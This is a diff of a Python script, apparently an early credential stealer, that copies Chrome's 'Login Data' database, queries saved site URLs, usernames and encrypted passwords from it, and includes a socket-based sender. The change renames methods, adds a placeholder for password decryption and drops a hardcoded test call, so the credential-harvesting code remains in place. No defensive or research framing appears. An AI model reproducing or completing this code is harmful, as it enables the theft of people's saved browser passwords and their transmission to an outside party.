@@ -1,7 +1,6 @@
 import socket
 import sqlite3
 import shutil
-from shutil import copyfile
 import os
 
 
@@ -13,21 +12,19 @@ class sender:
             client_socket.sendall(message)
 
 
-    def getChromeInfo(self, file):
+    def get_chrome_info(self, file):
         with sqlite3.connect(file) as connection:
             cursor = connection.cursor()
             res = cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
             return res.fetchall()
 
 
-    def copyFile(self):
+    def copy_file(self):
         path = '{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(os.path.expanduser('~'))
         shutil.copy(path, '{}s'.format(path))
 
 
-    def decryptPass(self, bPassword):
+    def decrypt_pass(self, bPassword):
+        print('to do')
 
 
-
-sender = sender()
-sender.getChromeInfo('C:/Users/gzx/Desktop/Login Data')
